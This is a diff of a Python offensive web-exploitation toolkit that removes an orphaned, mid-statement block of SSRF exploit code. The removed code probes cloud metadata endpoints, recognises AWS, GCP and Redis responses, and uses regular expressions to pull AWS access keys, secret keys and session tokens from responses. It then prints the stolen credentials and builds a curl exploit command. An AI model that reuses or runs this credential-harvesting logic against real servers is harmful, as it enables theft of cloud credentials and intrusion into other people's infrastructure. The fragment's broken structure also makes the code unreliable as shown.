@@ -1254,58 +1254,6 @@ class WebExploitationArsenal:
                         pass
         
         return vulns
-                                    cloud_type = 'gcp'
-                                    extracted_data = {'metadata_keys': lines[:10]}
-                            
-                            # Redis Format Validation
-                            elif 'redis_version' in response_text.lower() and 'role:' in response_text.lower():
-                                cloud_type = 'redis'
-                                extracted_data = {'preview': response_text[:200]}
-                            
-                            # Only report if we validated ACTUAL cloud metadata
-                            if cloud_type:
-                                print(Colors.critical(f"\n      [🔥 SSRF VALIDATED] {endpoint}?{param}= → {description}"))
-                                print(Colors.critical(f"      [💀 EXTRACTED] {cloud_type.upper()} metadata:"))
-                                print(Colors.success(f"        {str(extracted_data)[:300]}..."))
-                                
-                                # Try to extract AWS credentials if present
-                                credentials_found = {}
-                                if cloud_type == 'aws' and isinstance(extracted_data, dict):
-                                    import re
-                                    access_key = re.search(r'AKIA[0-9A-Z]{16}', response_text)
-                                    secret_key_match = re.search(r'"SecretAccessKey"\s*:\s*"([^"]+)"', response_text)
-                                    token_match = re.search(r'"Token"\s*:\s*"([^"]+)"', response_text)
-                                    
-                                    if access_key and validate_aws_key(access_key.group()):
-                                        credentials_found['AWS_ACCESS_KEY'] = access_key.group()
-                                    if secret_key_match:
-                                        credentials_found['AWS_SECRET_KEY'] = secret_key_match.group(1)[:50] + '...'
-                                    if token_match:
-                                        credentials_found['AWS_TOKEN'] = token_match.group(1)[:50] + '...'
-                                    
-                                    if credentials_found:
-                                        print(Colors.critical(f"      [💀💀💀 AWS CREDENTIALS EXTRACTED]:"))
-                                        for key, val in credentials_found.items():
-                                            print(Colors.success(f"        {key}: {val}"))
-                                
-                                vulns.append(Vulnerability(
-                                    type="SSRF_CLOUD_METADATA_LEAKED",
-                                    severity="CRITICAL",
-                                    location=f"{endpoint}?{param}=",
-                                    payload=payload_url,
-                                    evidence=f"{cloud_type.upper()} metadata validated | Credentials: {', '.join(credentials_found.keys()) if credentials_found else 'none'} | Data: {str(extracted_data)[:200]}",
-                                    description=f"SSRF vulnerability exposes {description} - {cloud_type.upper()} format validated",
-                                    remediation="Validate URLs against whitelist, disable internal DNS resolution, use IMDSv2 for AWS",
-                                    exploitable=True,
-                                    exploit_code=f"curl '{url}'"
-                                ))
-                                break
-                        
-                        time.sleep(self.config.delay)
-                    except:
-                        pass
-        
-        return vulns
     
     # ─────────────────────────────────────────────────────────────────────
     # CSRF ATTACKS - Cross-Site Request Forgery
